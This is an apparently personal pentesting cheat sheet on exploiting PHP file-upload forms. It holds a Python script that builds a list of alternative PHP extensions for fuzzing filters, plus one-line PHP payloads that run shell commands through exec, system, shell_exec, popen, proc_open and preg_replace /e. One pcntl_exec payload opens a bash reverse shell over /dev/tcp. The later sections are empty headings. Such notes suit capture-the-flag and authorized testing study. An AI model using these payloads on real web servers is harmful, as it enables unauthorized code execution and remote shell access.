#File_upload
**Test every php extension 

- Find the right extension with burp :
![[upload 2.png]]

- Script generate extension list : 

```python
var = ".php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module"
var_list = var.split(", ")

with open("extensions.txt", "w") as file:
    for extension in var_list:
        file.write(extension + "\n")
```   

![[upload 7.png]]

- Check every file that send an echo "test" : 
![[upload 6.png]]

`Same technique now check every response that print Demonize or "test"`

![[upload 4.png]]

- Check the disable function  :
![[upload 3.png]]

- Here is a list or other possible function to test to execute command : 

	- **exec** - Returns last line of commands output:
	 ``` echo exec("uname -a"); ```
	 - **passthru** - Passes commands output directly to the browser:
	 ```echo passthru("uname -a");```
	 - **system** - Passes commands output directly to the browser and returns last line:
	 ```echo system("uname -a");```
	 - **shell_exec** - Returns commands output :
	 ``` echo shell_exec("uname -a"); ```
	 - **popen** - Opens read or write pipe to process of a command:
	 ```echo fread(popen("/bin/ls /", "r"), 4096);```
	 - **proc_open** - Similar to popen() but greater degree of control:
	 ```proc_close(proc_open("uname -a",array(),$something)); ```
	 - **preg_replace** :
	 ``` <?php preg_replace('/.*/e', 'system("whoami");', ''); ?> ```
	 - **pcntl_exec** - Executes a program (by default in modern and not so modern PHP you need to load the `pcntl.so` module to use this function) :
	 ```pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);```

**Mime Type**:


**Magic Number/Exiftool ** :